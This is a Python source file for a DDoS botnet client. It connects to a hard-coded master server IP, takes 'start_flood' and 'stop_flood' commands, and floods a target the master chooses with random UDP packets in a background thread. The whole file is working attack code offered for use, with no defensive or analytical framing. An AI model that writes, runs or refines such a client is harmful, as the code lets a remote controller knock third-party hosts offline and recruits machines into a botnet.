import socket
import random
import time
import threading

# Flag to control the flood loop
flooding = False

def udp_flood(target_ip, target_port, packet_size, delay):
    """Flood the target with UDP packets."""
    global flooding
    flooding = True  # Set flooding flag
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)  # UDP socket
        print(f"Starting UDP flood to {target_ip}:{target_port} with packets of size {packet_size} and delay {delay}s")
        while flooding:
            payload = random._urandom(packet_size)  # Generate random payload
            sock.sendto(payload, (target_ip, target_port))
            print(f"Sent packet to {target_ip}:{target_port}")
            time.sleep(delay)
    except Exception as e:
        print(f"Error during UDP flood: {e}")
    finally:
        sock.close()
        print("Flooding stopped.")

def start_client():
    """Connect to the master server and listen for commands."""
    global flooding
    server_ip = "75.245.166.223"  # Master server public IP
    server_port = 12345           # Port the server listens on
    print(f"Attempting to connect to the master server at {server_ip}:{server_port}...")

    try:
        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # TCP socket
        client_socket.connect((server_ip, server_port))
        print(f"Connected to master server at {server_ip}:{server_port}")

        while True:
            # Receive command from master server
            command = client_socket.recv(1024).decode('utf-8')
            print(f"Received command: {command}")

            if command.startswith("start_flood"):
                # Extract flood parameters from the command
                try:
                    parts = command.split()
                    target_ip = parts[1]
                    target_port = int(parts[2])
                    packet_size = int(parts[3])
                    delay = float(parts[4])

                    # Start the flood in a separate thread
                    if not flooding:
                        flood_thread = threading.Thread(target=udp_flood, args=(target_ip, target_port, packet_size, delay))
                        flood_thread.start()
                    else:
                        print("Flood is already running.")
                except (IndexError, ValueError) as e:
                    print(f"Error parsing 'start_flood' command: {e}")
            elif command == "stop_flood":
                # Stop the flooding
                print("Received stop command. Stopping flood.")
                flooding = False
            else:
                print(f"Unknown command received: {command}")

    except socket.error as e:
        print(f"Socket error: {e}")
    except KeyboardInterrupt:
        print("Client interrupted by user.")
    finally:
        flooding = False  # Ensure flood stops if the client is interrupted
        client_socket.close()
        print("Disconnected from master server.")

if __name__ == "__main__":
    start_client()
